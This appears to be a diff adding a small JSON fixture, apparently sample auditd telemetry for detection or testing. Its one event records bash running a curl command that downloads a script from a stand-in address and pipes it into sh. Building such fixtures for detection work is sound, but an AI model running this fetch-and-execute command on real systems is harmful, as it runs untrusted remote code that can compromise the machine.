@@ -1,0 +1,9 @@
+[
+  {
+    "source": "auditd",
+    "image": "/usr/bin/bash",
+    "commandLine": "bash -c curl -s --max-time 2 http://192.0.2.10/install.sh | sh",
+    "user": "1000",
+    "currentDirectory": "/home/u"
+  }
+]
